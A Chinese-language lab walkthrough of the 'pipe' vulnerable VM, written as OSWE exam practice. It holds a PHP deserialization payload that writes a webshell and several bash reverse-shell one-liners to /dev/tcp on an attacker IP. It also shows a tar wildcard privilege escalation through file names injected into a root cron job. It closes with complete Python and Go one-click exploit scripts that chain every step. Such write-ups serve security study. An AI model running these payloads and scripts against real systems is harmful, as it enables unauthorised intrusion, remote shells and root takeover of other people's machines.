# pipe 笔记

## nmap

首先肯定使用nmap扫一下

`sudo nmap -A -T4 192.168.1.0/25`

这里因为我知道家里的路由是挨着分配的，不会超过128，所以这里用`0/25`扫，扫的快一点:

```
Nmap scan report for 192.168.1.20
Host is up (0.74s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f (DSA)
|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 (RSA)
|   256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 (ECDSA)
|_  256 7b:00:f7:dc:31:24:18:cf:e4:0a:ec:7a:32:d9:f6:a2 (ED25519)
80/tcp  open  http    Apache httpd
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=index.php
|_http-server-header: Apache
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36843/udp   status
|   100024  1          53080/tcp   status
|   100024  1          53968/udp6  status
|_  100024  1          57321/tcp6  status
MAC Address: B8:0E:22:80:CE:98 (Unknown)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT       ADDRESS
1   736.95 ms 192.168.1.20

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.09 seconds
```

## Web

这里可以看到只80端口开放，我们可以访问看看：

![](/Users/ebounce/learning/刷靶机笔记/pipe/1.png)

扫一下目录得到：

```shell
gobuster dir -u http://192.168.1.20/ -w /Users/ebounce/tools/kaliDir/directory-list-2.3-small.txt -t 50 -b 401
```

![](/Users/ebounce/learning/刷靶机笔记/pipe/3.png)

这里会弹出http验证，我们这里只需要更改访问方式即可绕过：

![](/Users/ebounce/learning/刷靶机笔记/pipe/4.png)

更改为POST或者其他请求方法均可：

![](/Users/ebounce/learning/刷靶机笔记/pipe/5.png)

渲染出来是这样：

![](/Users/ebounce/learning/刷靶机笔记/pipe/6.png)

这个时候访问扫出来的目录，显然`/scriptz`很可疑：

![](/Users/ebounce/learning/刷靶机笔记/pipe/7.png)

`log.php.BAK`内容如下：

```php
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
    $this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
    $now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
    file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
?>
```

显然是php反序列化问题，这里我们很容易就能判断出，可以通过构造恶意序列化数据，达到写入webshell的目的：

构造反序列化数据也很简单：

```php
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
        $this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
        $now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
        file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
$a = new Log();
$a->filename = "/var/www/html/scriptz/shell.php";
$a->data = '<?php echo "<p>"; system($_GET["ok"]); echo "<p\>"; ?>';
print(serialize($a));

?>
//O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:54:"<?php echo "<p>"; system($_GET["ok"]); echo "<p\>"; ?>";}
```

由于我们是反序列化数据，所以实际上不需要构造方法的触发，下一步只需要寻找反序列化的入口即可，结合`index.php`中的提示：

![](/Users/ebounce/learning/刷靶机笔记/pipe/8.png)

![](/Users/ebounce/learning/刷靶机笔记/pipe/9.png)

显然这里参数是`param`，同时由于js会构造序列化数据，因此很容易判断出这个参数就是反序列化的入口，传入payload：

![](/Users/ebounce/learning/刷靶机笔记/pipe/10.png)

再访问`/scriptz`目录，已经顺利写入`shell.php`了

![](/Users/ebounce/learning/刷靶机笔记/pipe/11.png)

可惜是非root权限:

![](/Users/ebounce/learning/刷靶机笔记/pipe/12.png)

## 系统层

先反弹一下shell，再看看下一步操作吧:

![](/Users/ebounce/learning/刷靶机笔记/pipe/13.png)

`bash -c 'exec bash -i &>/dev/tcp/192.168.1.13/19999 <&1'`

![](/Users/ebounce/learning/刷靶机笔记/pipe/14.png)

这里通过查看定时任务`/etc/crontab`发现存在root用户的定时任务，分别查看这两个sh的内容

`cat /etc/crontab`

![](/Users/ebounce/learning/刷靶机笔记/pipe/15.png)

`create_backup.sh`

![](/Users/ebounce/learning/刷靶机笔记/pipe/16.png)

很可惜，该sh没有权限

`compress.sh`

```
#!/bin/sh

rm -f /home/rene/backup/backup.tar.gz
cd /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK
```

这里是使用root用户运行的sh，同时使用tar命令和通配符，在这种情况下，我们能够使用tar命令进行提权

### tar 提权原理

原理是因为通配符，会匹配目录下的所有文件，这里是`/home/rene/backup`，而tar存在两个参数:

PS：如果直接tar是给了sudo权限，运行普通用户调用的话，其实直接执行下面的命令就可以了，下面仅讨论有通配符的情况

- --checkpoint=x 这里x表达写入x次，意思为每写入x次就进行一次检查点的操作

- --checkpoint-action=[command]=[param] 此处定义检查点的操作是什么，语法格式符合shell格式

举例子:

```shell
--checkpoint-action=exec=“echo 123”
---> exec "echo 123"
---> shell上会打印123 
```

所以如果我们创建一个sh文件，让tar在root权限的情况利用`checkpoint-action`执行sh脚本，即可实现提权。

`shell.sh`

```bash
www-data@pipe:/home/rene/backup$ echo "bash -c 'exec bash -i &>/dev/tcp/192.168.1.13/19998 <&1'" > shell.sh

bash -c 'exec bash -i &>/dev/tcp/192.168.1.13/19998 <&1'
```

随后创建两个空文件，但是名称为恶意参数:

```shell
touch "/home/rene/backup/--checkpoint-action=exec=sh shell.sh"
touch "/home/rene/backup/--checkpoint=1"
```

![](/Users/ebounce/learning/刷靶机笔记/pipe/20.png)

当然别忘了给`shell.sh`执行权限

```shell
chmod +x shell.sh
```

由于通配符的作用，该目录下的所有文件都会匹配上，等同于执行

```shell
tar cfz /home/rene/backup/backup.tar.gz --checkpoint-action=exec=sh shell.sh
tar cfz /home/rene/backup/backup.tar.gz --checkpoint=1
```

因为tar被定义好了检查操作，因此在包含完这两个恶意文件之后，下一次文件写入时就会触发反弹shell的操作,我们只需要远程监听，并且`/etc/crontab`中的定时任务触发即可，这里为每5分钟触发一次:

![](/Users/ebounce/learning/刷靶机笔记/pipe/19.png)

![](/Users/ebounce/learning/刷靶机笔记/pipe/=18.png)

拿到root权限，查看flag，

## 编写exp

### python

由于是准备`oswe`考试，因此我们还需要编写一键shell的脚本，这里用python

```python
import os
import urllib.parse
import requests


def web_exp():
    r = requests.post("http://192.168.1.20/index.php", data={
        "param": 'O:3:"Log":2:{s:8:"filename";s:32:"/var/www/html/scriptz/shell2.php";s:4:"data";s:54:"<?php echo "<p>"; system($_GET["ok"]); echo "<p\>"; ?>";}'})
    print(f"Write Webshell Successfully")
    r1 = requests.get("http://192.168.1.20/scriptz/shell2.php?ok=" + urllib.parse.quote(
        'touch "/home/rene/backup/--checkpoint-action=exec=sh shell2.sh"', "utf=8"))
    r2 = requests.get(
        "http://192.168.1.20/scriptz/shell2.php?ok=" + urllib.parse.quote('touch "/home/rene/backup/--checkpoint=1"',
                                                                          "utf=8"))
    r3 = requests.get("http://192.168.1.20/scriptz/shell2.php?ok=" + urllib.parse.quote(
        'echo "bash -c \'exec bash -i &>/dev/tcp/192.168.1.13/20000 <&1\'" > /home/rene/backup/shell2.sh', "utf=8"))
    r4 = requests.get(
        "http://192.168.1.20/scriptz/shell2.php?ok=" + urllib.parse.quote('chmod +x /home/rene/backup/shell2.sh',
                                                                          "utf=8"))
    print(f"Ready for Receiving Reverse Shell")


if __name__ == "__main__":
    web_exp()
    os.system("ncat -lvvp 20000")
```

![](/Users/ebounce/learning/刷靶机笔记/pipe/21.png)

成功反弹shell，并获得root权限。

### Golang

Golang版本查了很多资料，然后发现没那么复杂..

```go
package main

import (
    "bytes"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "os/exec"
)

func SendRequest(method string, urlstr string, data string) {
    PostData := url.Values{}
    PostData.Set("param", data)
    PostByte := []byte(PostData.Encode())
    req, err := http.NewRequest(method, urlstr, bytes.NewReader(PostByte))
    if err != nil {
        fmt.Println(err)
        return
    }
    client := &http.Client{}
    if method == "POST" {
        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    }
    resp, err := client.Do(req)
    if err != nil {
        fmt.Print(err)
    }
    defer func(Body io.ReadCloser) {
        err := Body.Close()
        if err != nil {
        }
    }(resp.Body)
}

func main() {
    var OriginData string = "http://192.168.1.20/index.php"
    var payload1 string = `O:3:"Log":2:{s:8:"filename";s:32:"/var/www/html/scriptz/shell3.php";s:4:"data";s:54:"<?php echo "<p>"; system($_GET["ok"]); echo "<p\>"; ?>";}`
    var shellUrl string = "http://192.168.1.20/scriptz/shell3.php?ok="
    var payload2 string = url.QueryEscape(`touch "/home/rene/backup/--checkpoint-action=exec=sh shell3.sh"`)
    var payload3 string = url.QueryEscape(`touch "/home/rene/backup/--checkpoint=1"`)
    var payload4 string = url.QueryEscape(`echo "bash -c 'exec bash -i &>/dev/tcp/192.168.1.13/20001 <&1'" > /home/rene/backup/shell3.sh`)
    var payload5 string = url.QueryEscape(`chmod +x /home/rene/backup/shell3.sh`)
    SendRequest("POST", OriginData, payload1)
    fmt.Println("Writing Webshell Done...")
    SendRequest("GET", shellUrl+payload2, "")
    SendRequest("GET", shellUrl+payload3, "")
    SendRequest("GET", shellUrl+payload4, "")
    SendRequest("GET", shellUrl+payload5, "")
    fmt.Println("Ready for Getting reverse shell....")
    cmd := exec.Command("ncat", "-lvvp", "20001")
    cmd.Stdout = os.Stdout
    cmd.Stdin = os.Stdin
    cmd.Stderr = os.Stderr
    _ = cmd.Run()
}
```

![](/Users/ebounce/learning/刷靶机笔记/pipe/22.png)
